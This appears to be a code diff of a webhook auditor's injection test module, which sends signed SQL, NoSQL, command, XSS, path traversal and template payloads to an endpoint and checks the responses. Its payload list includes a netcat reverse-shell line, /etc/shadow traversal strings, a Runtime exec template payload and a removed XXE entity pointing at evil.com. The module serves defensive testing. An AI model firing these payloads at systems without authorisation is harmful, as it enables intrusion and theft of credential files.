@@ -1,19 +1,31 @@
 """
-Injection Security Tests for Webhook Auditor
+Injection Attack Tests for STRIDE Threat Model
 
-Tests for various injection vulnerabilities including:
-- SQL Injection
-- NoSQL Injection
-- Command Injection
-- LDAP Injection
-- XML Injection
-- XPath Injection
-- Template Injection
+Comprehensive tests for SQL, NoSQL, Command, XSS, Path Traversal, and Template injection.
 """
-import httpx
-from typing import List, Dict
-from ..utils.crypto import calculate_hmac_signature
+
 import json
+from typing import Dict, List
+import httpx
+from ...utils.crypto import calculate_hmac_signature
+
+
+def capture_response_data(response: httpx.Response) -> Dict:
+    """
+    Capture response data for later analysis.
+    
+    Args:
+        response: HTTP response object
+    
+    Returns:
+        Dictionary containing response details
+    """
+    return {
+        "status_code": response.status_code,
+        "headers": dict(response.headers),
+        "body": response.text[:10000],  # Limit to 10KB to avoid memory issues
+        "elapsed_ms": response.elapsed.total_seconds() * 1000
+    }
 
 
 # Injection test payloads
@@ -44,32 +56,6 @@ INJECTION_PAYLOADS = {
         "; ping -c 10 127.0.0.1",
         "| nc -e /bin/sh 127.0.0.1 4444",
     ],
-    "ldap": [
-        "*",
-        "*)(&",
-        "*)(uid=*))(|(uid=*",
-        "admin)(&(password=*)",
-        "*))(|(objectClass=*",
-    ],
-    "xml": [
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
-        '<![CDATA[<script>alert("XSS")</script>]]>',
-    ],
-    "xpath": [
-        "' or '1'='1",
-        "' or ''='",
-        "x' or 1=1 or 'x'='y",
-        "//user[name/text()='' or '1'='1']",
-    ],
-    "template": [
-        "{{7*7}}",
-        "${7*7}",
-        "<%= 7*7 %>",
-        "{{config.items()}}",
-        "${T(java.lang.Runtime).getRuntime().exec('calc')}",
-        "#{7*7}",
-    ],
     "xss": [
         "<script>alert('XSS')</script>",
         "<img src=x onerror=alert('XSS')>",
@@ -87,10 +73,13 @@ INJECTION_PAYLOADS = {
         "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
         "../../../../../../etc/shadow",
     ],
-    "header_injection": [
-        "test\r\nX-Injected-Header: injected",
-        "test\nSet-Cookie: sessionid=malicious",
-        "test\r\nHTTP/1.1 200 OK\r\n",
+    "template": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "{{config.items()}}",
+        "${T(java.lang.Runtime).getRuntime().exec('calc')}",
+        "#{7*7}",
     ],
 }
 
@@ -114,7 +103,7 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
     # Check if shared secret is provided
     if not config.shared_secret:
         results.append({
-            "category": "Injection",
+            "category": "STRIDE - C06 Injection Attacks",
             "name": "Injection Tests",
             "status": "WARN",
             "details": "Skipped - No shared secret provided. These tests require HMAC signature validation."
@@ -127,14 +116,24 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
     try:
         sql_test_passed = True
         sql_details = []
+        sql_responses = []
+        
+        # Parse user's payload
+        try:
+            base_payload = json.loads(config.sample_valid_payload)
+        except:
+            base_payload = {"data": "test"}
         
         for sql_payload in INJECTION_PAYLOADS["sql"][:3]:  # Test first 3
-            payload_dict = {
-                "event": "user.login",
-                "username": sql_payload,
-                "email": f"test{sql_payload}@example.com",
-                "query": sql_payload
-            }
+            # Inject SQL payload into all string fields in user's payload
+            payload_dict = base_payload.copy()
+            for key in payload_dict:
+                if isinstance(payload_dict[key], str):
+                    payload_dict[key] = sql_payload
+            # Also add as new fields to test additional injection points
+            payload_dict["_test_username"] = sql_payload
+            payload_dict["_test_query"] = sql_payload
+            
             payload_bytes = json.dumps(payload_dict).encode('utf-8')
             valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
             
@@ -150,6 +149,15 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
                 headers=headers,
                 timeout=10.0
             )
+            
+            # Capture response for analysis
+            response_data = capture_response_data(response)
+
+            
+            # Capture response for analysis
+            response_data = capture_response_data(response)
+            response_data["payload"] = sql_payload
+            sql_responses.append(response_data)
             
             # Server should reject (4xx) or safely handle (2xx) but NOT crash (5xx)
             if 500 <= response.status_code < 600:
@@ -167,23 +175,25 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
         
         if sql_test_passed:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "SQL Injection Resistance",
                 "status": "PASS",
-                "details": "Server handled SQL injection attempts without errors or information disclosure"
+                "details": "Server handled SQL injection attempts without errors or information disclosure",
+                "responses": sql_responses
             })
         else:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "SQL Injection Resistance",
                 "status": "FAIL",
                 "details": f"SQL injection vulnerability detected: {', '.join(sql_details)}",
                 "risk": "Attackers can manipulate database queries to access or modify data",
-                "mitigation": "Use parameterized queries/prepared statements, never concatenate user input into SQL"
+                "mitigation": "Use parameterized queries/prepared statements, never concatenate user input into SQL",
+                "responses": sql_responses
             })
     except Exception as e:
         results.append({
-            "category": "Injection Attacks",
+            "category": "STRIDE - C06 Injection Attacks",
             "name": "SQL Injection Resistance",
             "status": "WARN",
             "details": f"Test failed with error: {str(e)}"
@@ -192,13 +202,22 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
     # Test 2: NoSQL Injection
     try:
         nosql_test_passed = True
+        nosql_responses = []
+        
+        # Parse user's payload
+        try:
+            base_payload = json.loads(config.sample_valid_payload)
+        except:
+            base_payload = {"data": "test"}
         
         for nosql_payload in INJECTION_PAYLOADS["nosql"][:2]:
-            payload_dict = {
-                "event": "user.query",
-                "filter": nosql_payload,
-                "username": nosql_payload
-            }
+            # Inject NoSQL payload into user's payload
+            payload_dict = base_payload.copy()
+            for key in payload_dict:
+                if isinstance(payload_dict[key], str):
+                    payload_dict[key] = nosql_payload
+            payload_dict["_test_filter"] = nosql_payload
+            
             payload_bytes = json.dumps(payload_dict).encode('utf-8')
             valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
             
@@ -215,20 +234,25 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
                 timeout=10.0
             )
             
+            # Capture response for analysis
+            response_data = capture_response_data(response)
+
+            
             if 500 <= response.status_code < 600:
                 nosql_test_passed = False
                 break
         
         if nosql_test_passed:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "NoSQL Injection Resistance",
                 "status": "PASS",
-                "details": "Server handled NoSQL injection attempts safely"
+                "details": "Server handled NoSQL injection attempts safely",
+                "response": response_data
             })
         else:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "NoSQL Injection Resistance",
                 "status": "FAIL",
                 "details": "NoSQL injection caused server errors",
@@ -237,7 +261,7 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
             })
     except Exception as e:
         results.append({
-            "category": "Injection Attacks",
+            "category": "STRIDE - C06 Injection Attacks",
             "name": "NoSQL Injection Resistance",
             "status": "WARN",
             "details": f"Test failed with error: {str(e)}"
@@ -247,13 +271,25 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
     try:
         cmd_test_passed = True
         
+        # Parse user's payload
+        try:
+            base_payload = json.loads(config.sample_valid_payload)
+        except Exception as e:
+            # If user's payload is invalid, use fallback
+            base_payload = {"event": "test", "data": "sample"}
+        
         for cmd_payload in INJECTION_PAYLOADS["command"][:3]:
-            payload_dict = {
-                "event": "file.process",
-                "filename": cmd_payload,
-                "command": cmd_payload,
-                "path": cmd_payload
-            }
+            payload_dict = base_payload.copy()
+            
+            # Inject command payload into all string fields
+            for key in payload_dict:
+                if isinstance(payload_dict[key], str):
+                    payload_dict[key] = cmd_payload
+            
+            # Add test-specific fields
+            payload_dict["_test_filename"] = cmd_payload
+            payload_dict["_test_command"] = cmd_payload
+            
             payload_bytes = json.dumps(payload_dict).encode('utf-8')
             valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
             
@@ -269,6 +305,10 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
                 headers=headers,
                 timeout=10.0
             )
+            
+            # Capture response for analysis
+            response_data = capture_response_data(response)
+
             
             # Check for command execution evidence in response
             response_text = response.text.lower()
@@ -279,14 +319,15 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
         
         if cmd_test_passed:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "Command Injection Resistance",
                 "status": "PASS",
-                "details": "Server handled command injection attempts safely"
+                "details": "Server handled command injection attempts safely",
+                "response": response_data
             })
         else:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "Command Injection Resistance",
                 "status": "FAIL",
                 "details": "Command injection may be possible - suspicious output detected",
@@ -295,7 +336,7 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
             })
     except Exception as e:
         results.append({
-            "category": "Injection Attacks",
+            "category": "STRIDE - C06 Injection Attacks",
             "name": "Command Injection Resistance",
             "status": "WARN",
             "details": f"Test failed with error: {str(e)}"
@@ -306,13 +347,24 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
         xss_test_passed = True
         reflected_xss = []
         
+        # Parse user's payload
+        try:
+            base_payload = json.loads(config.sample_valid_payload)
+        except Exception as e:
+            base_payload = {"event": "test", "data": "sample"}
+        
         for xss_payload in INJECTION_PAYLOADS["xss"][:3]:
-            payload_dict = {
-                "event": "comment.created",
-                "comment": xss_payload,
-                "name": xss_payload,
-                "message": xss_payload
-            }
+            payload_dict = base_payload.copy()
+            
+            # Inject XSS payload into all string fields
+            for key in payload_dict:
+                if isinstance(payload_dict[key], str):
+                    payload_dict[key] = xss_payload
+            
+            # Add test-specific fields
+            payload_dict["_test_comment"] = xss_payload
+            payload_dict["_test_message"] = xss_payload
+            
             payload_bytes = json.dumps(payload_dict).encode('utf-8')
             valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
             
@@ -329,6 +381,10 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
                 timeout=10.0
             )
             
+            # Capture response for analysis
+            response_data = capture_response_data(response)
+
+            
             # Check if XSS payload is reflected in response without encoding
             if xss_payload in response.text or '<script>' in response.text.lower():
                 xss_test_passed = False
@@ -336,14 +392,14 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
         
         if xss_test_passed:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "XSS (Cross-Site Scripting) Protection",
                 "status": "PASS",
                 "details": "Server properly encodes output, no XSS payloads reflected"
             })
         else:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "XSS (Cross-Site Scripting) Protection",
                 "status": "FAIL",
                 "details": f"XSS vulnerability detected - payloads reflected unencoded: {', '.join(reflected_xss)}",
@@ -352,7 +408,7 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
             })
     except Exception as e:
         results.append({
-            "category": "Injection Attacks",
+            "category": "STRIDE - C06 Injection Attacks",
             "name": "XSS (Cross-Site Scripting) Protection",
             "status": "WARN",
             "details": f"Test failed with error: {str(e)}"
@@ -362,13 +418,24 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
     try:
         path_test_passed = True
         
+        # Parse user's payload
+        try:
+            base_payload = json.loads(config.sample_valid_payload)
+        except Exception as e:
+            base_payload = {"event": "test", "data": "sample"}
+        
         for path_payload in INJECTION_PAYLOADS["path_traversal"][:3]:
-            payload_dict = {
-                "event": "file.read",
-                "filename": path_payload,
-                "path": path_payload,
-                "file": path_payload
-            }
+            payload_dict = base_payload.copy()
+            
+            # Inject path traversal payload into all string fields
+            for key in payload_dict:
+                if isinstance(payload_dict[key], str):
+                    payload_dict[key] = path_payload
+            
+            # Add test-specific fields
+            payload_dict["_test_filename"] = path_payload
+            payload_dict["_test_path"] = path_payload
+            
             payload_bytes = json.dumps(payload_dict).encode('utf-8')
             valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
             
@@ -384,6 +451,10 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
                 headers=headers,
                 timeout=10.0
             )
+            
+            # Capture response for analysis
+            response_data = capture_response_data(response)
+
             
             # Check for file content in response
             response_text = response.text.lower()
@@ -394,14 +465,15 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
         
         if path_test_passed:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "Path Traversal Protection",
                 "status": "PASS",
-                "details": "Server protected against path traversal attempts"
+                "details": "Server protected against path traversal attempts",
+                "response": response_data
             })
         else:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "Path Traversal Protection",
                 "status": "FAIL",
                 "details": "Path traversal vulnerability detected - system files may be accessible",
@@ -410,7 +482,7 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
             })
     except Exception as e:
         results.append({
-            "category": "Injection Attacks",
+            "category": "STRIDE - C06 Injection Attacks",
             "name": "Path Traversal Protection",
             "status": "WARN",
             "details": f"Test failed with error: {str(e)}"
@@ -420,12 +492,24 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
     try:
         template_test_passed = True
         
+        # Parse user's payload
+        try:
+            base_payload = json.loads(config.sample_valid_payload)
+        except Exception as e:
+            base_payload = {"event": "test", "data": "sample"}
+        
         for template_payload in INJECTION_PAYLOADS["template"][:3]:
-            payload_dict = {
-                "event": "render.template",
-                "template": template_payload,
-                "message": template_payload
-            }
+            payload_dict = base_payload.copy()
+            
+            # Inject template payload into all string fields
+            for key in payload_dict:
+                if isinstance(payload_dict[key], str):
+                    payload_dict[key] = template_payload
+            
+            # Add test-specific fields
+            payload_dict["_test_template"] = template_payload
+            payload_dict["_test_message"] = template_payload
+            
             payload_bytes = json.dumps(payload_dict).encode('utf-8')
             valid_signature = calculate_hmac_signature(secret_bytes, payload_bytes, config.signature_prefix)
             
@@ -442,6 +526,10 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
                 timeout=10.0
             )
             
+            # Capture response for analysis
+            response_data = capture_response_data(response)
+
+            
             # Check if template was evaluated (e.g., {{7*7}} becomes 49)
             if '49' in response.text or 'config' in response.text.lower():
                 template_test_passed = False
@@ -449,14 +537,15 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
         
         if template_test_passed:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "Template Injection Protection",
                 "status": "PASS",
-                "details": "Server protected against template injection"
+                "details": "Server protected against template injection",
+                "response": response_data
             })
         else:
             results.append({
-                "category": "Injection Attacks",
+                "category": "STRIDE - C06 Injection Attacks",
                 "name": "Template Injection Protection",
                 "status": "FAIL",
                 "details": "Template injection vulnerability detected",
@@ -465,7 +554,7 @@ async def run_injection_tests(config, client: httpx.AsyncClient) -> List[Dict]:
             })
     except Exception as e:
         results.append({
-            "category": "Injection Attacks",
+            "category": "STRIDE - C06 Injection Attacks",
             "name": "Template Injection Protection",
             "status": "WARN",
             "details": f"Test failed with error: {str(e)}"
